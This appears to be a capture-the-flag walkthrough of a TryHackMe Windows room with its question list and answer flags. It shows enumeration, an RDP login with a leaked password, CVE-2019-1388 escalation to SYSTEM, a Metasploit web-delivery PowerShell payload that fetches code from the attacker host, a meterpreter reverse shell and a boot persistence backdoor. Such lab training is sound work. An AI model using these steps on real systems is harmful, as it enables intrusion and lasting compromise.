---
Throughout this room, we'll be looking at alternative modes of exploitation without the use of Metasploit or really exploitation tools in general beyond nmap and dirbuster. To wrap up the room, we'll be pivoting back to these tools for persistence and additional steps we can take. 
---
### rustscan
`port 80 http, 3389 rdesktop`
### gobuster
```
gobuster dir --url http://10.10.41.27 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 30 -k -x py,html,txt
```
==/retro==
~~10.10.41.27/retro/index.php/2019/12/09/ready-player-one/~~ `comment -> Leaving myself a note here just in case I forget how to spell it: parzival`
### remote desktop
```
xfreerdp /u:Wade /p:'parzival' /v:10.10.41.27 /size:90%
```
### priv esc
`hhupd.exe` 
[CVE-2019-1388](https://www.youtube.com/watch?v=3BQKpPNlTSo)
```cmd
whoami /groups
```
==open hhupd.exe/show details/certificates/issued by/download file from explorer/ error found/ close/ search C:\Windows\System32\*.*\open cmd==
```
whoami
```
>The NT AUTHORITY\SYSTEM account also has the highest privileges on the local computer
```
cd ..\..
```
```
cd C:\Users\Administrator\Desktop
```
```root.txt
more root.txt
```

### metasploit

```
msfconsole -q
```
```
use exploit/multi/script/web_delivery
```
```
show options
```
```
show targets
```
>Exploit targets:
   Id  Name   
   0   Python
   1   PHP
   2   PSH
   3   Regsvr32
   4   pubprn
   5   SyncAppvPublishingServer
   6   PSH (Binary)
   7   Linux
   8   Mac OS X

```
set target PSH
```
```
set LHOST 10.18.1.00
```
```
set LPORT 1234
```
```
set payload windows/meterpreter/reverse_http
```
```
run -j
```
>powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABmAFgAUgBXAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGYAWABSAFcALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABmAFgAUgBXAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQA4AC4AMQAuADcANwA6ADgAMAA4ADAALwBYAHQANgBoADQAdQBnAFIATwBCAHYALwBSAEkAaQBBAG0AdABnAEcAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAOAAuADEALgA3ADcAOgA4ADAAOAAwAC8AWAB0ADYAaAA0AHUAZwBSAE8AQgB2ACcAKQApADsA

==copy in cmd compomised before==
`enter, enter`
```
show sessions
```
```
sessions -i 1
```
```
run persistence -X
```

- How many ports are open on our target system? *2*
- Looks like there's a web server running, what is the title of the page we discover when browsing to it? *IIS Windows Server*
- Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?*/retro*
- Navigate to our discovered hidden directory, what potential username do we discover? *Wade*
- Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?*parzival*
- Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?*THM{HACK_PLAYER_ONE}*
- When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?*CVE-2019-1388*
- Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?*hhupd*
- Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?*nt authority\system*
- Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!*THM{COIN_OPERATED_EXPLOITATION}*
- Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.*No answer needed*
- First, let's set the target to PSH (PowerShell). Which target number is PSH?*2*
- After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network. *No answer needed*
- Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.*No answer needed*
- Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched. In this case, I've found it particularly helpful to host a simple python web server (python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. Once you've run this command, return to our attacker machine and note that our reverse shell has spawned. *No answer needed*
- Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup. *run persistence -X*
- Run this command now with options that allow it to connect back to your host machine should the system reboot. Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice. Congrats, you've now gain full control over the remote host and have established persistence for further operations!*No answer needed*

















